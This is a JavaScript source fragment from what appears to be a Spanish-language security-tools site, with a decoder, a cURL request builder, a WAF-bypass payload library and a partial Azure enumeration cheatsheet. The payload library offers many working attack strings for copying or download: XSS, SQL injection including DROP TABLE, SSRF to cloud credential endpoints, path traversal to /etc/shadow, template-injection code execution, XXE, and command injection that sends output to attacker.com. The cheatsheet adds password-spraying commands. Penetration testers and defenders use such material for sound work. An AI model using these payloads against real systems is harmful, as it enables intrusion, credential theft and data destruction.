            base64: function(s) {
                try {
                    const clean = s.replace(/[\s]/g, '');
                    if (!/^[a-zA-Z0-9+/]*={0,2}$/.test(clean)) return null;
                    const decoded = decodeURIComponent(escape(atob(clean)));
                    return decoded !== s ? decoded : null;
                } catch(e) { return null; }
            },
            url: function(s) {
                try { const d = decodeURIComponent(s); return d !== s ? d : null; } 
                catch(e) { return null; }
            },
            html: function(s) {
                try {
                    const d = document.createElement('div'); d.innerHTML = s;
                    const t = d.textContent; return t !== s ? t : null;
                } catch(e) { return null; }
            },
            hex: function(s) {
                const clean = s.replace(/\s|0x|\\x/g, '');
                if (!/^[0-9a-fA-F]+$/.test(clean) || clean.length % 2 !== 0) return null;
                let r = '';
                for (let i = 0; i < clean.length; i += 2) r += String.fromCharCode(parseInt(clean.substr(i, 2), 16));
                return r !== s ? r : null;
            },
            rot13: function(s) {
                const r = s.replace(/[a-zA-Z]/g, c => {
                    return String.fromCharCode((c <= 'Z' ? 90 : 122) >= (c = c.charCodeAt(0) + 13) ? c : c - 26);
                });
                return r !== s ? r : null;
            },
            unicode: function(s) {
                try {
                    const d = s.replace(/\\u([0-9a-fA-F]{4})/g, (m, p) => String.fromCharCode(parseInt(p, 16)));
                    return d !== s ? d : null;
                } catch(e) { return null; }
            },
            jwt: function(s) {
                const parts = s.split('.');
                if (parts.length < 2) return null;
                function dec(str) {
                    str = str.replace(/-/g, '+').replace(/_/g, '/');
                    const pad = str.length % 4; if (pad) str += '===='.slice(pad);
                    return JSON.stringify(JSON.parse(decodeURIComponent(escape(atob(str)))), null, 2);
                }
                try { return 'Header:\n' + dec(parts[0]) + '\n\nPayload:\n' + dec(parts[1]); } 
                catch(e) { return null; }
            }
        };

        function detectEncoding(s) {
            const order = ['jwt', 'url', 'base64', 'html', 'unicode', 'hex', 'rot13'];
            for (let i = 0; i < order.length; i++) {
                try { const r = DECODERS[order[i]](s); if (r !== null && r !== s) return { type: order[i], result: r }; } catch(e) {}
            }
            return null;
        }

        function escapeHTML(s) {
            const d = document.createElement('div'); d.textContent = String(s || ''); return d.innerHTML;
        }

        function renderStepHtml(step, idx) {
            return `
            <div class="md-step-card">
                <div class="md-step-header">
                    <span class="md-step-badge">${step.type.toUpperCase()}</span>
                    <span style="font-family:var(--mono); font-size:0.75rem; color:var(--gray-dark);">Capa ${idx + 1}</span>
                    <button class="copy-btn-mini" data-copy="${escapeHTML(step.result)}" style="margin-left:auto;">📋</button>
                </div>
                <pre style="padding:1rem; font-family:var(--mono); font-size:0.85rem; color:rgba(255,255,255,0.9); white-space:pre-wrap; word-break:break-all; margin:0; max-height:250px; overflow-y:auto;">${escapeHTML(step.result)}</pre>
            </div>`;
        }

        function attachCopyEvents() {
            document.querySelectorAll('#md-chain .copy-btn-mini').forEach(b => {
                b.addEventListener('click', function() {
                    window.copyToClipboard(this.dataset.copy);
                    this.textContent = '✅'; setTimeout(() => this.textContent = '📋', 1500);
                });
            });
        }

        btnDecode.addEventListener('click', () => {
            const s = mdInput.value.trim();
            if (!s) return;
            let result = null, type = null;
            if (activeMode !== 'auto') {
                try { result = DECODERS[activeMode](s); type = activeMode; } catch(e) {}
            } else {
                const d = detectEncoding(s); if (d) { result = d.result; type = d.type; }
            }

            if (result !== null && result !== undefined) {
                mdChain.innerHTML = renderStepHtml({ type, result }, 0); attachCopyEvents();
            } else {
                mdChain.innerHTML = `<p style="color:var(--gray); font-family:var(--mono); margin-top:1rem; padding: 1rem; background: rgba(0,0,0,0.3); border-radius: 0.5rem;">❌ No se pudo decodificar.</p>`;
            }
        });

        btnAutoChain.addEventListener('click', () => {
            const s = mdInput.value.trim();
            if (!s) return;
            let steps = [], current = s, max = 10;
            while (steps.length < max) {
                const d = detectEncoding(current);
                if (!d || d.result === current) break;
                steps.push(d); current = d.result;
            }

            if (!steps.length) {
                mdChain.innerHTML = `<p style="color:var(--gray); font-family:var(--mono); margin-top:1rem; padding: 1rem; background: rgba(0,0,0,0.3); border-radius: 0.5rem;">❌ No se detectaron encodings conocidos.</p>`;
                return;
            }

            const arrow = `<div class="md-arrow">↓</div>`;
            let html = `
            <div class="md-step-card" style="border-color: rgba(0,255,255,0.2);">
                <div class="md-step-header" style="background: rgba(0,255,255,0.05);">
                    <span style="font-family:var(--mono); font-size:0.75rem; color:var(--cyan); font-weight:bold;">TEXTO ORIGINAL</span>
                </div>
                <pre style="padding:1rem; font-family:var(--mono); font-size:0.85rem; color:var(--gray); white-space:pre-wrap; word-break:break-all; margin:0;">${escapeHTML(s.slice(0, 500))}${s.length > 500 ? '...' : ''}</pre>
            </div>${arrow}`;

            steps.forEach((st, i) => { html += renderStepHtml(st, i) + (i < steps.length - 1 ? arrow : ''); });
            mdChain.innerHTML = html; attachCopyEvents();
        });

        exampleBtns.forEach(btn => {
            btn.addEventListener('click', () => { mdInput.value = btn.dataset.payload; btnAutoChain.click(); });
        });

    })(); 
    // =========================================================
    // 21. Herramienta: HTTP Request Builder
    // =========================================================
    (function() {
        const hbMethod = document.getElementById('hb-method');
        if (!hbMethod) return;

        const lang = window.LANG || 'es';
        let reqHeaders = [];
        let currentBtype = 'JSON';

        const hbUrl = document.getElementById('hb-url');
        const hbBody = document.getElementById('hb-body');
        const hbAuthType = document.getElementById('hb-auth-type');
        const curlOut = document.getElementById('hb-curl-output');
        const headersList = document.getElementById('hb-headers-list');

        // Pestañas (Tabs)
        document.querySelectorAll('.hb-tab-btn').forEach(btn => {
            btn.addEventListener('click', function() {
                document.querySelectorAll('.hb-tab-btn').forEach(b => b.classList.remove('active'));
                document.querySelectorAll('.hb-tab-content').forEach(c => c.classList.remove('active'));
                this.classList.add('active');
                document.getElementById('tab-' + this.dataset.tab).classList.add('active');
            });
        });

        // Tipo de Body
        document.querySelectorAll('.hb-btype-btn').forEach(btn => {
            btn.addEventListener('click', function() {
                document.querySelectorAll('.hb-btype-btn').forEach(b => b.classList.remove('active'));
                this.classList.add('active');
                currentBtype = this.dataset.btype;
                generateCurl();
            });
        });

        // Cambio de Autenticación
        hbAuthType.addEventListener('change', function() {
            document.querySelectorAll('.hb-auth-section').forEach(el => el.style.display = 'none');
            if (this.value !== 'none') {
                document.getElementById('auth-' + this.value).style.display = 
                    (this.value === 'bearer') ? 'block' : 'grid'; // Grid para los que tienen 2 campos
            }
            generateCurl();
        });

        // Gestión de Headers (Añadir / Eliminar)
        function renderHeadersUI() {
            let html = '';
            reqHeaders.forEach((h, i) => {
                html += `
                <div class="hb-header-row">
                    <input type="text" class="cyber-input hb-h-key" data-idx="${i}" value="${escapeHTML(h.k)}" placeholder="Header-Name" style="margin-bottom:0;">
                    <input type="text" class="cyber-input hb-h-val" data-idx="${i}" value="${escapeHTML(h.v)}" placeholder="Value" style="margin-bottom:0;">
                    <button type="button" class="hb-del-btn" data-idx="${i}">✕</button>
                </div>`;
            });
            headersList.innerHTML = html;
        }

        document.getElementById('btn-hb-add-header').addEventListener('click', () => {
            reqHeaders.push({ k: '', v: '' });
            renderHeadersUI();
            generateCurl();
        });

        document.querySelectorAll('.hb-preset-header').forEach(btn => {
            btn.addEventListener('click', function() {
                reqHeaders.push({ k: this.dataset.key, v: this.dataset.val });
                renderHeadersUI();
                generateCurl();
            });
        });

        // Event Delegation para los inputs de headers generados dinámicamente
        headersList.addEventListener('input', (e) => {
            if (e.target.classList.contains('hb-h-key')) {
                reqHeaders[e.target.dataset.idx].k = e.target.value;
                generateCurl();
            }
            if (e.target.classList.contains('hb-h-val')) {
                reqHeaders[e.target.dataset.idx].v = e.target.value;
                generateCurl();
            }
        });

        headersList.addEventListener('click', (e) => {
            if (e.target.classList.contains('hb-del-btn')) {
                reqHeaders.splice(e.target.dataset.idx, 1);
                renderHeadersUI();
                generateCurl();
            }
        });

        function escapeHTML(s) {
            const d = document.createElement('div'); d.textContent = String(s || ''); return d.innerHTML;
        }

        // Generador Principal de cURL
        function generateCurl() {
            const method = hbMethod.value;
            const url = hbUrl.value.trim() || 'https://api.target.com/v1/users';
            const body = hbBody.value.trim();
            const authType = hbAuthType.value;

            let parts = ['curl -s -i'];
            if (method !== 'GET') parts.push('-X ' + method);

            // Capa de Autenticación
            let authHeader = '';
            if (authType === 'bearer') {
                const t = document.getElementById('hb-bearer').value.trim();
                if (t) authHeader = 'Authorization: Bearer ' + t;
            } else if (authType === 'basic') {
                const u = document.getElementById('hb-basic-user').value.trim();
                const p = document.getElementById('hb-basic-pass').value.trim();
                if (u) parts.push(`-u "${u}:${p}"`);
            } else if (authType === 'apikey') {
                const n = document.getElementById('hb-ak-name').value.trim();
                const v = document.getElementById('hb-ak-val').value.trim();
                if (n && v) authHeader = n + ': ' + v;
            } else if (authType === 'custom') {
                const hn = document.getElementById('hb-custom-h').value.trim();
                const hv = document.getElementById('hb-custom-v').value.trim();
                if (hn && hv) authHeader = hn + ': ' + hv;
            }
            
            if (authHeader) parts.push(`-H "${authHeader}"`);

            // Headers Personalizados
            reqHeaders.forEach(h => {
                if (h.k) parts.push(`-H "${h.k}: ${h.v}"`);
            });

            // Capa de Body
            if (body && method !== 'GET' && method !== 'HEAD') {
                const ct = (currentBtype === 'JSON') ? 'application/json' : 
                           (currentBtype === 'Form') ? 'application/x-www-form-urlencoded' : 'text/xml';
                parts.push(`-H "Content-Type: ${ct}"`);
                
                // Escapar comillas simples para bash
                const safeBody = body.replace(/'/g, "'\\''");
                parts.push(`--data '${safeBody}'`);
            }

            parts.push(`"${url}"`);
            curlOut.textContent = parts.join(' \\\n  ');
        }

        // Escuchar cambios globales
        const inputs = document.querySelectorAll('#hb-url, #hb-method, #hb-body, #hb-bearer, #hb-basic-user, #hb-basic-pass, #hb-ak-name, #hb-ak-val, #hb-custom-h, #hb-custom-v');
        inputs.forEach(el => {
            el.addEventListener(el.tagName === 'SELECT' ? 'change' : 'input', generateCurl);
        });

        // Botón Copiar
        document.getElementById('btn-hb-copy').addEventListener('click', function() {
            if (typeof window.copyToClipboard === 'function') {
                window.copyToClipboard(curlOut.textContent, this);
            } else {
                navigator.clipboard.writeText(curlOut.textContent).catch(e => console.error(e));
            }
            const originalText = this.innerHTML;
            this.textContent = '✅ ' + (lang === 'es' ? 'Copiado' : 'Copied');
            setTimeout(() => this.innerHTML = originalText, 1500);
        });

        // Init
        generateCurl();
    })();
    // =========================================================
    // 22. Herramienta: WAF Bypass Payload Library
    // =========================================================
    (function() {
        const wafCat = document.getElementById('waf-cat');
        if (!wafCat) return; // Salir si no estamos en la página del WAF

        console.log("✅ WAF Payload Library cargada.");

        const wafSearch = document.getElementById('waf-search');
        const wafList = document.getElementById('waf-list');
        const wafCount = document.getElementById('waf-count');
        const btnCopyAll = document.getElementById('btn-waf-copy');
        const btnDownload = document.getElementById('btn-waf-dl');
        const lang = window.LANG || 'es';

        // Gran base de datos de Payloads
        const PAYLOADS = {
            xss: [
                {tag:'Basic', p:'<script>alert(1)<\/script>'},
                {tag:'Basic', p:'<img src=x onerror=alert(1)>'},
                {tag:'Basic', p:'<svg onload=alert(1)>'},
                {tag:'Basic', p:"<body onload=alert`1`>"},
                {tag:'Case bypass', p:'<ScRiPt>alert(1)<\/ScRiPt>'},
                {tag:'Case bypass', p:'<IMG SRC=x OnErRoR=alert(1)>'},
                {tag:'HTML encoded', p:'&lt;script&gt;alert(1)&lt;/script&gt;'},
                {tag:'URL encoded', p:'%3Cscript%3Ealert(1)%3C%2Fscript%3E'},
                {tag:'Double encoded', p:'%253Cscript%253Ealert(1)%253C%252Fscript%253E'},
                {tag:'Unicode', p:'\u003cscript\u003ealert(1)\u003c/script\u003e'},
                {tag:'Null byte', p:'<scri%00pt>alert(1)</scri%00pt>'},
                {tag:'Tab/newline', p:'<script\t>alert(1)</script>'},
                {tag:'Comment', p:'<scri<!--xss-->pt>alert(1)</sc<!--xss-->ript>'},
                {tag:'JS Protocol', p:"javascript:alert(1)"},
                {tag:'JS Protocol', p:"jAvAsCrIpT:alert(1)"},
                {tag:'JS Protocol', p:"java&#115;cript:alert(1)"},
                {tag:'Data URI', p:'<a href="data:text/html,<script>alert(1)<\/script>">click</a>'},
                {tag:'SVG', p:"<svg/onload=alert(1)>"},
                {tag:'SVG', p:'<svg><script>alert(1)<\/script></svg>'},
                {tag:'Input', p:'" onmouseover="alert(1)'},
                {tag:'Input', p:"' onfocus='alert(1)' autofocus='"},
                {tag:'Template', p:'{{constructor.constructor("alert(1)")()}}'},
                {tag:'Angular', p:'{{7*7}}{{constructor.constructor("alert(1)")()}}'},
                {tag:'DOM XSS', p:"#<img src=x onerror=alert(1)>"},
                {tag:'Polyglot', p:"jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>>"},
                {tag:'Filter bypass', p:'<details open ontoggle=alert(1)>'},
                {tag:'Filter bypass', p:'<video><source onerror="alert(1)">'},
                {tag:'Filter bypass', p:'<marquee onstart=alert(1)>'},
                {tag:'Iframe', p:'<iframe src="javascript:alert(1)">'},
                {tag:'Iframe', p:'<iframe srcdoc="<script>alert(1)<\/script>">'},
            ],
            sqli: [
                {tag:'Basic', p:"' OR '1'='1"},
                {tag:'Basic', p:"' OR 1=1--"},
                {tag:'Basic', p:"1' OR '1'='1'--"},
                {tag:'Basic', p:"admin'--"},
                {tag:'Union', p:"' UNION SELECT null,null,null--"},
                {tag:'Union', p:"' UNION SELECT username,password,null FROM users--"},
                {tag:'Case bypass', p:"' Or 1=1--"},
                {tag:'Case bypass', p:"' uNiOn sElEcT null--"},
                {tag:'Comment bypass', p:"'/**/OR/**/1=1--"},
                {tag:'Comment bypass', p:"'/*!OR*/1=1--"},
                {tag:'URL encoded', p:"%27%20OR%201%3D1--"},
                {tag:'Double encoded', p:"%2527%2520OR%25201%253D1--"},
                {tag:'Hex bypass', p:"' OR 0x313d31--"},
                {tag:'Time-based', p:"'; WAITFOR DELAY '0:0:5'--"},
                {tag:'Time-based', p:"' AND SLEEP(5)--"},
                {tag:'Stacked', p:"'; DROP TABLE users--"},
                {tag:'Error-based', p:"' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--"},
                {tag:'Boolean', p:"' AND 1=2--"},
                {tag:'Boolean', p:"' AND 1=1--"},
                {tag:'Out-of-band', p:"' UNION SELECT LOAD_FILE('/etc/passwd')--"},
                {tag:'Whitespace', p:"'\t OR\t 1=1--"},
                {tag:'Newline', p:"'\nOR\n1=1--"},
                {tag:'WAF bypass', p:"'%20OR%201%3D1--"},
                {tag:'WAF bypass', p:"'||'1'='1"},
                {tag:'NoSQL', p:'{"$gt":""}'},
                {tag:'NoSQL', p:'{"$where":"sleep(5000)"}'},
            ],
            ssrf: [
                {tag:'Localhost', p:'http://localhost/'},
                {tag:'Localhost', p:'http://127.0.0.1/'},
                {tag:'Localhost', p:'http://[::1]/'},
                {tag:'Localhost', p:'http://0.0.0.0/'},
                {tag:'Localhost', p:'http://0/'},
                {tag:'Localhost', p:'http://127.1/'},
                {tag:'Localhost', p:'http://2130706433/'},
                {tag:'Localhost', p:'http://0x7f000001/'},
                {tag:'Protocol', p:'file:///etc/passwd'},
                {tag:'Protocol', p:'file:///C:/Windows/win.ini'},
                {tag:'Protocol', p:'dict://localhost:6379/info'},
                {tag:'Protocol', p:'gopher://localhost:6379/_INFO%0D%0A'},
                {tag:'AWS metadata', p:'http://169.254.169.254/latest/meta-data/'},
                {tag:'AWS metadata', p:'http://169.254.169.254/latest/meta-data/iam/security-credentials/'},
                {tag:'GCP metadata', p:'http://metadata.google.internal/computeMetadata/v1/'},
                {tag:'Azure metadata', p:'http://169.254.169.254/metadata/instance?api-version=2021-02-01'},
                {tag:'Azure metadata', p:'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'},
                {tag:'DNS rebind', p:'http://7f000001.1.1.1.1.nip.io/'},
                {tag:'IPv6 bypass', p:'http://[::ffff:127.0.0.1]/'},
                {tag:'Redirect', p:'http://attacker.com/redirect?url=http://localhost/'},
                {tag:'URL bypass', p:'http://localtest.me/'},
                {tag:'URL bypass', p:'http://spoofed.burpcollaborator.net/'},
            ],
            lfi: [
                {tag:'Basic', p:'../../../etc/passwd'},
                {tag:'Basic', p:'../../../../../../etc/shadow'},
                {tag:'Basic', p:'....//....//....//etc/passwd'},
                {tag:'URL encoded', p:'..%2F..%2F..%2Fetc%2Fpasswd'},
                {tag:'Double encoded', p:'..%252F..%252F..%252Fetc%252Fpasswd'},
                {tag:'Null byte', p:'../../../etc/passwd%00'},
                {tag:'Unicode', p:'..%c0%af..%c0%af..%c0%afetc/passwd'},
                {tag:'Windows', p:'..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts'},
                {tag:'Windows', p:'..%5C..%5C..%5CWindows%5Csystem.ini'},
                {tag:'PHP wrappers', p:'php://filter/convert.base64-encode/resource=index.php'},
                {tag:'PHP wrappers', p:'php://input'},
                {tag:'PHP wrappers', p:'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4='},
                {tag:'PHP wrappers', p:'expect://id'},
                {tag:'Log poisoning', p:'/var/log/apache2/access.log'},
                {tag:'Log poisoning', p:'/var/log/nginx/access.log'},
                {tag:'Log poisoning', p:'/proc/self/environ'},
                {tag:'Interesting', p:'/etc/hosts'},
                {tag:'Interesting', p:'/etc/crontab'},
                {tag:'Interesting', p:'/proc/self/cmdline'},
                {tag:'Interesting', p:'C:\\Windows\\System32\\drivers\\etc\\hosts'},
            ],
            ssti: [
                {tag:'Detection', p:'{{7*7}}'},
                {tag:'Detection', p:'${7*7}'},
                {tag:'Detection', p:'<%= 7*7 %>'},
                {tag:'Detection', p:'{{7*\'7\'}}'},
                {tag:'Jinja2 RCE', p:"{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0]}}"},
                {tag:'Jinja2 RCE', p:"{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"},
                {tag:'Jinja2 bypass', p:"{%raw%}{{7*7}}{%endraw%}"},
                {tag:'Twig RCE', p:"{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}"},
                {tag:'Freemarker RCE', p:'${freemarker.template.utility.Execute?new()("id")}'},
                {tag:'Velocity RCE', p:'#set($x="")#set($rt=$x.class.forName("java.lang.Runtime"))#set($chr=$x.class.forName("java.lang.Character"))#set($str=$x.class.forName("java.lang.String"))#set($ex=$rt.getRuntime().exec("id"))'},
                {tag:'ERB (Ruby)', p:'<%= system("id") %>'},
                {tag:'ERB (Ruby)', p:'<%= `id` %>'},
                {tag:'Smarty', p:'{system("id")}'},
                {tag:'Pebble', p:'{{ variable.getClass().forName("java.lang.Runtime").getMethod("exec","".getClass()).invoke(variable.getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id") }}'},
            ],
            cmdi: [
                {tag:'Basic Unix', p:'; id'},
                {tag:'Basic Unix', p:'| id'},
                {tag:'Basic Unix', p:'|| id'},
                {tag:'Basic Unix', p:'& id'},
                {tag:'Basic Unix', p:'&& id'},
                {tag:'Basic Unix', p:'`id`'},
                {tag:'Basic Unix', p:'$(id)'},
                {tag:'Windows', p:'& whoami'},
                {tag:'Windows', p:'| whoami'},
                {tag:'Windows', p:'&& ipconfig'},
                {tag:'Windows', p:'; dir'},
                {tag:'Blind - oob', p:'; curl http://attacker.com/$(whoami)'},
                {tag:'Blind - oob', p:'| nslookup $(whoami).attacker.com'},
                {tag:'Blind - time', p:'; sleep 5'},
                {tag:'Blind - time', p:'& timeout /T 5'},
                {tag:'Bypass space', p:';{IFS}id'},
                {tag:'Bypass space', p:';${IFS}id'},
                {tag:'Bypass space', p:';$IFS$9id'},
                {tag:'Bypass filter', p:';w\\ho\\am\\i'},
                {tag:'Bypass filter', p:";/???/??t /???/p??s??"},
                {tag:'URL encoded', p:'%3B%20id'},
                {tag:'Newline', p:'%0a id'},
            ],
            xxe: [
                {tag:'Basic', p:'<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'},
                {tag:'Basic Win', p:'<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]><root>&xxe;</root>'},
                {tag:'SSRF via XXE', p:'<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>'},
                {tag:'Blind OOB', p:'<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]><root></root>'},
                {tag:'Error-based', p:'<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///nonexistent">]><root>&xxe;</root>'},
                {tag:'XInclude', p:'<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>'},
                {tag:'SVG XXE', p:'<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]><svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>'},
                {tag:'SOAP XXE', p:'<![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">%dtd;]><doc>&external;</doc>]]>'},
                {tag:'PHP expect', p:'<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "expect://id">]><root>&xxe;</root>'},
            ],
            redirect: [
                {tag:'Basic', p:'//evil.com'},
                {tag:'Basic', p:'///evil.com'},
                {tag:'Basic', p:'https://evil.com'},
                {tag:'Basic', p:'//evil%2ecom'},
                {tag:'Protocol', p:'javascript:alert(1)'},
                {tag:'Protocol', p:'data:text/html,<script>alert(1)<\/script>'},
                {tag:'@bypass', p:'https://trusted.com@evil.com'},
                {tag:'@bypass', p:'//trusted.com%40evil.com'},
                {tag:'Subdomain', p:'https://trusted.com.evil.com'},
                {tag:'CRLF', p:'/redirect?url=%0d%0aLocation:%20https://evil.com'},
                {tag:'URL encoded', p:'%68%74%74%70%73%3A%2F%2Fevil.com'},
                {tag:'Double encoded', p:'%2568%2574%2574%2570%2573%253A%252F%252Fevil.com'},
                {tag:'Unicode', p:'https://evil｡com'},
                {tag:'Whitelisted', p:'https://evil.com?url=https://trusted.com'},
                {tag:'Fragment', p:'https://trusted.com#https://evil.com'},
            ]
        };

        function escapeHTML(s) {
            const d = document.createElement('div');
            d.textContent = String(s || '');
            return d.innerHTML;
        }

        function renderPayloads() {
            const cat = wafCat.value;
            const q = wafSearch.value.toLowerCase();
            const list = (PAYLOADS[cat] || []).filter(p => !q || p.p.toLowerCase().includes(q) || p.tag.toLowerCase().includes(q));

            wafCount.innerHTML = `<span style="color:var(--cyan); font-weight:bold;">${list.length}</span> ${lang === 'es' ? 'payloads encontrados' : 'payloads found'}`;

            let html = '';
            let curTag = '';

            list.forEach(item => {
                if (item.tag !== curTag) {
                    if (curTag) html += '</div>'; // Cerrar bloque anterior
                    curTag = item.tag;
                    html += `<div class="waf-tag-header">${escapeHTML(item.tag)}</div><div>`;
                }
                html += `
                <div class="waf-payload-row">
                    <div class="waf-payload-text" data-copy="${escapeHTML(item.p)}" title="${lang === 'es' ? 'Clic para copiar' : 'Click to copy'}">
                        ${escapeHTML(item.p)}
                    </div>
                    <button type="button" class="copy-btn-mini" data-copy="${escapeHTML(item.p)}">📋</button>
                </div>`;
            });

            if (curTag) html += '</div>';
            if (!list.length) html = `<p style="font-family:var(--mono); color:var(--gray); padding:1rem 0;">${lang === 'es' ? 'No se encontraron payloads.' : 'No payloads found.'}</p>`;

            wafList.innerHTML = html;

            // Delegación de eventos para copiar (Sirve para el texto y para el botón)
            document.querySelectorAll('#waf-list .waf-payload-text, #waf-list .copy-btn-mini').forEach(el => {
                el.addEventListener('click', function() {
                    const txtToCopy = this.dataset.copy;
                    if (typeof window.copyToClipboard === 'function') {
                        window.copyToClipboard(txtToCopy, this); // Usa la función global segura
                    } else {
                        navigator.clipboard.writeText(txtToCopy).catch(e => console.error(e));
                    }
                    
                    // Feedback visual
                    if (this.tagName === 'BUTTON') {
                        this.textContent = '✅';
                        setTimeout(() => this.textContent = '📋', 1500);
                    } else {
                        const originalBorder = this.style.borderColor;
                        this.style.borderColor = 'var(--cyan)';
                        setTimeout(() => this.style.borderColor = originalBorder, 500);
                    }
                });
            });
        }

        // Eventos
        wafCat.addEventListener('change', renderPayloads);
        wafSearch.addEventListener('input', renderPayloads);

        btnCopyAll.addEventListener('click', function() {
            const cat = wafCat.value;
            const all = (PAYLOADS[cat] || []).map(p => p.p).join('\n');
            if (typeof window.copyToClipboard === 'function') {
                window.copyToClipboard(all, this);
            } else {
                navigator.clipboard.writeText(all).catch(e => console.error(e));
            }
            const originalText = this.innerHTML;
            this.textContent = '✅ ' + (lang === 'es' ? 'Copiados' : 'Copied');
            setTimeout(() => this.innerHTML = originalText, 2000);
        });

        btnDownload.addEventListener('click', () => {
            const cat = wafCat.value;
            const all = (PAYLOADS[cat] || []).map(p => p.p).join('\n');
            const blob = new Blob([all], { type: 'text/plain' });
            const a = document.createElement('a');
            a.href = URL.createObjectURL(blob);
            a.download = `waf_bypass_${cat}_cyberescudo.txt`;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
        });

        // Init
        renderPayloads();

    })();
    // =========================================================
    // 23. Herramienta: Cloud Enum Cheatsheet
    // =========================================================
    (function() {
        const cloudTargetInput = document.getElementById('cloud-target');
        if (!cloudTargetInput) return; // Si no existe el input, no estamos en la página

        console.log("✅ Cloud Enum Cheatsheet cargado.");

        const targetLabel = document.getElementById('target-label');
        const sectionPillsContainer = document.getElementById('section-pills');
        const cloudCmdsContainer = document.getElementById('cloud-cmds');
        const cloudTabs = document.querySelectorAll('.cloud-tab-btn');
        const lang = window.LANG || 'es';

        let currentCloud = 'azure';
        let activeSection = 'all';

        const DATA = {
            azure: {
                target_label: lang==='es' ? 'Tenant (ej: empresa.onmicrosoft.com)' : 'Tenant (e.g. empresa.onmicrosoft.com)',
                placeholder: 'empresa.onmicrosoft.com',
                sections: {
                    'Reconocimiento': [
                        {desc: lang==='es'?'Verificar si el tenant existe':'Check if tenant exists', cmd: 'curl "https://login.microsoftonline.com/{TARGET}/.well-known/openid-configuration" | jq .'},
                        {desc: lang==='es'?'Enumerar usuarios con AADInternals':'Enumerate users with AADInternals', cmd: 'Invoke-AADIntReconAsOutsider -Domain {TARGET} | fl'},
                        {desc: lang==='es'?'Comprobar si autenticación ADFS o Cloud':'Check if ADFS or Cloud auth', cmd: 'curl "https://login.microsoftonline.com/getuserrealm.srf?login=user@{TARGET}&json=1"'},
                        {desc: lang==='es'?'Enumerar subdominios Azure (Subfinder)':'Enumerate Azure subdomains (Subfinder)', cmd: 'subfinder -d {TARGET} | grep -iE "azure|blob|mail|sharepoint|onmicrosoft"'},
                        {desc: lang==='es'?'Buscar storage accounts públicos':'Find public storage accounts', cmd: 'for word in backup data files static media; do curl -s -o /dev/null -w "%{http_code} $word\\n" https://{TARGET%-*}${word}.blob.core.windows.net/?comp=list; done'},
                        {desc: lang==='es'?'Verificar si Microsoft Teams está configurado':'Check if Microsoft Teams is configured', cmd: 'curl "https://teams.microsoft.com/api/mt/apac/beta/users/{TARGET}/externalsearchv3?includeTFLUsers=true"'}
                    ],
                    'Autenticación': [
                        {desc: lang==='es'?'Login con credenciales (az cli)':'Login with credentials (az cli)', cmd: 'az login -u user@{TARGET} -p "Password123"'},
                        {desc: lang==='es'?'Login con token de acceso':'Login with access token', cmd: 'az login --use-device-code'},
                        {desc: lang==='es'?'Password spray con MSOLSpray':'Password spray with MSOLSpray', cmd: "Invoke-MSOLSpray -UserList users.txt -Password 'Empresa2024!' -Verbose"},
                        {desc: lang==='es'?'Obtener token OAuth2':'Get OAuth2 token', cmd: 'curl -X POST "https://login.microsoftonline.com/{TARGET}/oauth2/token" -d "grant_type=password&client_id=1950a258-227b-4e31-a9cf-717495945fc2&resource=https://graph.microsoft.com&username=user@{TARGET}&password=Password123"'},
                        {desc: lang==='es'?'Enumerar cuentas válidas (sin contraseña)':'Enumerate valid accounts (no password)', cmd: 'python3 o365spray.py --validate --domain {TARGET}'}
                    ],
                    'Enumeración AAD': [
                        {desc: lang==='es'?'Listar usuarios de la organización':'List organisation users', cmd: 'az ad user list --query "[].{UPN:userPrincipalName, Name:displayName, Role:jobTitle}" -o table'},
                        {desc: lang==='es'?'Buscar usuarios administradores':'Find admin users', cmd: 'az ad user list | jq \'.[]\' | grep -i admin'},
                        {desc: lang==='es'?'Listar grupos':'List groups', cmd: 'az ad group list --query "[].{Name:displayName, ID:id}" -o table'},
                        {desc: lang==='es'?'Listar aplicaciones registradas':'List registered applications', cmd: 'az ad app list --query "[].{Name:displayName, AppID:appId, URL:homepage}" -o table'},
                        {desc: lang==='es'?'Buscar Service Principals':'Find Service Principals', cmd: 'az ad sp list --query "[].{Name:displayName, AppID:appId}" -o table'},
                        {desc: lang==='es'?'Ver roles asignados a un usuario':'View roles assigned to a user', cmd: 'az role assignment list --query "[].{Role:roleDefinitionName, User:principalName, Scope:scope}" -o table'}
                    ],
                    'Recursos Azure': [
                        {desc: lang==='es'?'Listar suscripciones accesibles':'List accessible subscriptions', cmd: 'az account list --query "[].{Name:name, ID:id, State:state}" -o table'},
                        {desc: lang==='es'?'Listar todos los recursos':'List all resources', cmd: 'az resource list --query "[].{Name:name, Type:type, RG:resourceGroup}" -o table | sort'},
                        {desc: lang==='es'?'Listar VMs':'List VMs', cmd: 'az vm list --query "[].{Name:name, OS:storageProfile.osDisk.osType, RG:resourceGroup, IP:privateIps}" -o table'},
